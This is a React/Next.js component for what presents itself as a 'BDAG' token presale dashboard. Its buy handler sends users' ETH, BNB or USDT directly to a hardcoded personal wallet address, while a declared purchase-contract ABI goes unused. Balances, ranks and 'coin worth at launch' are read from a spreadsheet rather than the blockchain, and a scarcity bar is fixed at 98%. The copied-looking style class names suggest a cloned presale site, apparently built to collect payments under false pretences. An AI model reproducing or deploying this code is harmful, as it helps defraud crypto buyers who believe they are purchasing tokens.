'use client';
import React, { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import BuyMiner from './buyMiner';
import RankProgress from './rankProgress';
import BeatVestingModal from './beatVestingModal';
import SelectCurrencyModal from './selectCurrencyModal';
import Transaction from './transaction';
import WalletPurchaseMethods from './WalletPurchaseMethods';
import { useSheetData } from '../hooks/useSheetData';
import { parseSheetData } from '../utils/sheetParser';
import { parseConstantsData } from '../utils/parseConstantsData';
import { useActiveWallet, useSendTransaction, useActiveWalletConnectionStatus } from "thirdweb/react";
import { prepareContractCall, toWei } from "thirdweb";
import { ethers } from "ethers";
const contractAddress = "0x43D033C19eA0A9f8F2459b9A51dC97f59B7725bB";
const abi = [
  {
    "inputs": [
      { "internalType": "uint256", "name": "usdEquivalent", "type": "uint256" }
    ],
    "name": "buyWithETH",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
];

const DESTINATION_WALLET = "0xecB518e9D8a14e74DFBa3Ba044D7be9951A95395";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_ABI = ["function transfer(address to, uint256 value) public returns (bool)"];


export const MainArea = () => {
  const router = useRouter();

  const [storedWallet, setStoredWallet] = useState(null);

useEffect(() => {
  if (typeof window !== "undefined") {
    setStoredWallet(localStorage.getItem("walletAddress"));
  }
}, []);
  // Data and state management
    const [activeTab, setActiveTab] = useState('buyBDAG');
  const [activePaymentMethod, setActivePaymentMethod] = useState('ETH');
  const [amount, setAmount] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isCurrencyModalOpen, setIsCurrencyModalOpen] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState({
    message: "",
    isError: false,
    isLoading: false
  });

  const wallet = useActiveWallet();
  const connectionStatus = useActiveWalletConnectionStatus();
  const { mutate: sendTransaction } = useSendTransaction();
  const [walletAddress, setWalletAddress] = useState("");
  const { data: sheetData } = useSheetData(walletAddress);
  const { data: constantsData } = useSheetData("Constants");
  const { profile } = parseSheetData(sheetData);
  const constants = parseConstantsData(constantsData);

  // Sync wallet address to state and localStorage, clear on disconnect
  useEffect(() => {
    const syncWallet = async () => {
      if (connectionStatus === "connected" && wallet) {
        try {
          const account = await wallet.getAccount();
          if (account?.address) {
            setWalletAddress(account.address);
            localStorage.setItem("walletAddress", account.address);
          }
        } catch (err) {
          setWalletAddress("");
          localStorage.removeItem("walletAddress");
        }
      } else {
        setWalletAddress("");
        localStorage.removeItem("walletAddress");
      }
    };
    syncWallet();
  }, [connectionStatus, wallet]);

  console.log(walletAddress , wallet);

  // Logout handler
  const handleLogout = async () => {
    if (wallet) await wallet.disconnect();
    setWalletAddress("");
    localStorage.removeItem("walletAddress");
    // Optionally redirect or show a message
  };



const handleBuy = useCallback(async () => {
  if (!wallet) {
    setTransactionStatus({ isLoading: false, message: "Please connect your wallet first.", isError: true });
    return;
  }
  if (!amount || parseFloat(amount) <= 0) {
    setTransactionStatus({ isLoading: false, message: "Please enter a valid amount.", isError: true });
    return;
  }

  setTransactionStatus({ isLoading: true, message: `Preparing ${amount} ${activePaymentMethod} transaction...`, isError: false });

  try {
    const account = await wallet.getAccount();
    if (!account?.address) {
      throw new Error("Wallet account not found. Please reconnect your wallet.");
    }

    console.log("Wallet info:", {
      address: account.address,
      walletId: wallet.id,
      hasGetSigner: typeof wallet.getSigner === 'function',
      hasProvider: !!wallet.provider
    });

    // For ETH/BNB transactions, try thirdweb first
    if (activePaymentMethod === "ETH" || activePaymentMethod === "BNB") {
      try {
        if (!ethers.utils.isAddress(DESTINATION_WALLET)) {
          throw new Error("Invalid destination address");
        }

        console.log("Attempting thirdweb transaction...");
        const transaction = {
          to: DESTINATION_WALLET,
          value: toWei(amount),
          gas: 21000n,
        };
        
        const result = await sendTransaction(transaction);
        console.log("Thirdweb transaction result:", result);
        
        setTransactionStatus({ 
          isLoading: true, 
          message: `Transaction sent: ${result.transactionHash || 'Processing'}. Waiting for confirmation...`, 
          isError: false 
        });
        
        setTimeout(() => {
          setTransactionStatus({ 
            isLoading: false, 
            message: "Transaction sent successfully! Please check your wallet for confirmation.", 
            isError: false 
          });
        }, 3000);
        return;

      } catch (thirdwebError) {
        console.log("Thirdweb method failed:", thirdwebError);
        // Continue to fallback methods
      }
    }

    // Enhanced fallback methods for mobile compatibility
    let signer = null;
    let provider = null;

    // Method 1: Try wallet.getSigner()
    if (typeof wallet.getSigner === 'function') {
      try {
        console.log("Trying wallet.getSigner()...");
        signer = await wallet.getSigner();
        console.log("getSigner successful");
      } catch (error) {
        console.log("getSigner failed:", error.message);
      }
    }

    // Method 2: Try wallet.provider
    if (!signer && wallet.provider) {
      try {
        console.log("Trying wallet.provider...");
        if (typeof wallet.provider.request === 'function') {
          // Mobile wallet providers often need explicit account request
          await wallet.provider.request({ method: 'eth_requestAccounts' });
        }
        provider = new ethers.providers.Web3Provider(wallet.provider);
        signer = provider.getSigner();
        console.log("Wallet provider method successful");
      } catch (error) {
        console.log("Wallet provider method failed:", error.message);
      }
    }

    // Method 3: Try window.ethereum (for mobile browsers)
    if (!signer && typeof window !== "undefined" && window.ethereum) {
      try {
        console.log("Trying window.ethereum...");
        // Request account access
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        console.log("Window.ethereum method successful");
      } catch (error) {
        console.log("Window.ethereum method failed:", error.message);
      }
    }

    // Method 4: Try EIP-1193 provider detection (mobile wallets)
    if (!signer && typeof window !== "undefined") {
      try {
        console.log("Trying EIP-1193 provider detection...");
        // Check for various mobile wallet providers
        const possibleProviders = [
          window.ethereum,
          window.web3?.currentProvider,
          window.trustWallet,
          window.coinbaseWalletExtension,
          window.metamask
        ].filter(Boolean);

        for (const possibleProvider of possibleProviders) {
          try {
            if (possibleProvider && typeof possibleProvider.request === 'function') {
              await possibleProvider.request({ method: 'eth_requestAccounts' });
              provider = new ethers.providers.Web3Provider(possibleProvider);
              signer = provider.getSigner();
              console.log("EIP-1193 provider successful");
              break;
            }
          } catch (providerError) {
            console.log("Provider failed:", providerError.message);
            continue;
          }
        }
      } catch (error) {
        console.log("EIP-1193 detection failed:", error.message);
      }
    }

    if (!signer) {
      throw new Error("Unable to connect to wallet. Please ensure your wallet app is open and try again.");
    }

    // Validate destination address
    if (!ethers.utils.isAddress(DESTINATION_WALLET)) {
      throw new Error("Invalid destination address");
    }

    let tx;

    if (activePaymentMethod === "ETH" || activePaymentMethod === "BNB") {
      console.log("Preparing ETH transaction...");
      
      // Check balance first
      const balance = await signer.getBalance();
      const amountWei = ethers.utils.parseEther(amount);
      
      if (balance.lt(amountWei)) {
        throw new Error(`Insufficient balance. You have ${ethers.utils.formatEther(balance)} ETH`);
      }

      const transactionRequest = {
        to: DESTINATION_WALLET,
        value: amountWei,
        gasLimit: 21000,
      };

      // Try to get gas price, but don't fail if it's not available
      try {
        const gasPrice = await signer.getGasPrice();
        transactionRequest.gasPrice = gasPrice;
      } catch (gasPriceError) {
        console.log("Could not get gas price, using network default");
      }

      // Try to estimate gas, but use default if it fails
      try {
        const estimatedGas = await signer.estimateGas(transactionRequest);
        transactionRequest.gasLimit = estimatedGas.mul(120).div(100);
      } catch (gasError) {
        console.log("Gas estimation failed, using default:", gasError.message);
      }

      tx = await signer.sendTransaction(transactionRequest);
      
    } else if (activePaymentMethod === "USDT") {
      console.log("Preparing USDT transaction...");
      
      // Updated USDT ABI
      const USDT_ABI_FULL = [
        "function transfer(address to, uint256 value) public returns (bool)",
        "function balanceOf(address owner) public view returns (uint256)",
        "function decimals() public view returns (uint8)",
        "function allowance(address owner, address spender) public view returns (uint256)",
        "function approve(address spender, uint256 value) public returns (bool)"
      ];

      const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI_FULL, signer);
      const userAddress = await signer.getAddress();
      const amountInSmallestUnit = ethers.utils.parseUnits(amount, 6);
      
      // Check network
      const network = await signer.provider.getNetwork();
      if (network.chainId !== 1) {
        throw new Error("Please switch to Ethereum mainnet to use USDT");
      }
      
      // Check USDT balance
      try {
        const balance = await usdtContract.balanceOf(userAddress);
        console.log("USDT Balance:", ethers.utils.formatUnits(balance, 6));
        
        if (balance.lt(amountInSmallestUnit)) {
          throw new Error(`Insufficient USDT balance. You have ${ethers.utils.formatUnits(balance, 6)} USDT`);
        }
      } catch (balanceError) {
        if (balanceError.message.includes("Insufficient")) {
          throw balanceError;
        }
        console.log("Balance check failed, proceeding:", balanceError.message);
      }
      
      // Estimate gas and send transaction
      try {
        const gasEstimate = await usdtContract.estimateGas.transfer(DESTINATION_WALLET, amountInSmallestUnit);
        const gasPrice = await signer.getGasPrice();
        
        tx = await usdtContract.transfer(DESTINATION_WALLET, amountInSmallestUnit, {
          gasLimit: gasEstimate.mul(130).div(100),
          gasPrice: gasPrice
        });
      } catch (gasEstimateError) {
        console.log("Gas estimation failed, using higher default");
        const gasPrice = await signer.getGasPrice();
        tx = await usdtContract.transfer(DESTINATION_WALLET, amountInSmallestUnit, {
          gasLimit: 100000,
          gasPrice: gasPrice
        });
      }
    } else {
      throw new Error("Unsupported payment method.");
    }

    setTransactionStatus({ 
      isLoading: true, 
      message: `Transaction sent: ${tx.hash}. Waiting for confirmation...`, 
      isError: false 
    });
    
    const receipt = await tx.wait();
    setTransactionStatus({ 
      isLoading: false, 
      message: `Transaction confirmed! Hash: ${receipt.transactionHash}`, 
      isError: false 
    });

  } catch (error) {
    console.error("Transaction failed:", error);
    
    let errorMessage = "Transaction failed: ";
    
    if (error.code === 'INSUFFICIENT_FUNDS') {
      errorMessage += "Insufficient funds for transaction and gas fees.";
    } else if (error.code === 'USER_REJECTED' || error.code === 4001) {
      errorMessage += "Transaction was rejected by user.";
    } else if (error.message?.includes('Insufficient')) {
      errorMessage += error.message;
    } else if (error.message?.includes('Invalid destination')) {
      errorMessage += error.message;
    } else if (error.message?.includes('switch to Ethereum mainnet')) {
      errorMessage += error.message;
    } else if (error.message?.includes('wallet app is open')) {
      errorMessage += error.message;
    } else if (error.message?.includes('Wallet account not found')) {
      errorMessage += error.message;
    } else {
      errorMessage += error.reason || error.message || "Unknown error occurred. Please try refreshing the page.";
    }
    
    setTransactionStatus({ 
      isLoading: false, 
      message: errorMessage, 
      isError: true 
    });
  }
}, [wallet, amount, activePaymentMethod, sendTransaction]);



  // Modal handlers (keep existing)
  const handleOpenCurrencyModal = () => setIsCurrencyModalOpen(true);
  const handleCloseCurrencyModal = () => setIsCurrencyModalOpen(false);
  const handleOpenModal = () => setIsModalOpen(true);
  const handleCloseModal = () => setIsModalOpen(false);

  if (connectionStatus === 'connecting') {
    return (
      <div className="style_overview__iPKe6" style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '50vh' }}>
        <p>Connecting to wallet...</p>
      </div>
    );
  }

  return (
    <div className="style_overview__iPKe6">
      <RankProgress current={profile["Current Rank"]} next={profile["Next rank"]} leveltoUp={profile["req to level up"]} />
      <div className="style_balanceSection__K0yQq">
        <div className="style_balances__lxOoR">
          <div className="style_balanceBox___25FT">
            <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Total BDAG Balance</p>
            <p className="style_title__VJGg6 __className_665d18 style_sm__fI_bB">
              {profile["Total Balance"] ? `${profile["Total Balance"]} BDAG` : "0.00 BDAG"}
            </p>
            <div className="style_icon__jwMyF">
              {/* ...svg... */}
            </div>
          </div>
          <div className="style_balanceBox___25FT">
            <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Your Coin Worth at Launch</p>
            <p className="style_title__VJGg6 __className_665d18 style_sm__fI_bB">
              {profile["your coin worth at launch"] || "0.00"}
            </p>
            <div className="style_icon__jwMyF">
              {/* ...svg... */}
            </div>
          </div>
        </div>
      </div>
      
      <div className="style_purchase__X5B7u">
        <div className="wallet_wallet__HKWGq wallet_shouldLogin__ai97O">
          <div id="buy" className="wallet_anchor__W3ZBk"></div>
          <div className="wallet_modalHead__Q3MP_">
            <div className="wallet_modalHeadArea__CUzyB">
              <p 
                className={activeTab === 'buyBDAG' ? "wallet_active__9n3l6" : ""}
                onClick={() => setActiveTab('buyBDAG')}
              >
                Buy BDAG
              </p>
              <p 
                className={activeTab === 'buyMiner' ? "wallet_active__9n3l6" : ""}
                onClick={() => setActiveTab('buyMiner')}
              >
                Buy Miner
              </p>
            </div>
          </div>
          
          {activeTab === 'buyBDAG' ? (
            <div className="wallet_walletWrapper__6pNfN">
              <div className="wallet_walletHead__N6OWX">
                <div className="wallet_doubleIt__OhJ0r">
                  <p 
                    className="wallet_doubleText__JRiZM __className_665d18"
                    onClick={handleOpenModal}
                    style={{ cursor: 'pointer' }}
                  >
                    BUY, BEAT VESTING PASS!
                  </p>
                </div>
                <div className="wallet_walletHeadCoin__G_Gxn">
                  <div className="wallet_walletHeadItem__2_GYQ">
                    <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Total Coin Sales</p>
                    <p className="style_text__Z44aT style_md__ZQhe4 style_font-700__9q48B">
                      {constants["Total Coin sales"] || "$0.00"}
                    </p>
                  </div>
                  <div className="wallet_walletHeadItem__2_GYQ">
                    <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Total Coins Sold</p>
                    <p className="style_text__Z44aT style_md__ZQhe4 style_font-700__9q48B">
                      {constants["Total coins sold"] || "0"}
                    </p>
                  </div>
                </div>
                <div className="style_bar__PrR89">
                  <div className="style_spans__yvuK_">
                    <span>Remaining</span>
                    <span translate="no">{constants["Remaining bar"] || "0"}</span>
                  </div>
                  <span className="style_progress__IPzew" style={{width: "98%"}}></span>
                  <span className="style_progressTitle__SWVW1" style={{left: "98%"}}></span>
                </div>
                <div className="wallet_walletHeadCoin__G_Gxn">
                  <div className="wallet_walletPriceItem__E7HOg">
                    <p className="style_text__Z44aT style_md__ZQhe4">1 BDAG:</p>
                    <p className="style_text__Z44aT style_md__ZQhe4">
                      ${constants["Batch Price"] || "0.00"}
                    </p>
                  </div>
                  <div className="wallet_walletPriceItem__E7HOg">
                    <p className="style_text__Z44aT style_md__ZQhe4">Next Batch:</p>
                    <p className="style_text__Z44aT style_md__ZQhe4">
                      ${constants["Next Batch"] || "0.00"}
                    </p>
                  </div>
                </div>
              </div>
              
              <WalletPurchaseMethods
                activePaymentMethod={activePaymentMethod}
                setActivePaymentMethod={setActivePaymentMethod}
                amount={amount}
                setAmount={setAmount}
                handleBuy={handleBuy}
                transactionStatus={transactionStatus}
                handleOpenCurrencyModal={handleOpenCurrencyModal}
                handleOpenModal={handleOpenModal}
              />
            </div>
          ) : (
            <BuyMiner handleClickModal={handleOpenCurrencyModal} />
          )}
        </div>
      </div>
      <Transaction />

      {isModalOpen && <BeatVestingModal onClose={handleCloseModal} />}
      {isCurrencyModalOpen && <SelectCurrencyModal onClose={handleCloseCurrencyModal} />}
    </div>
  );
};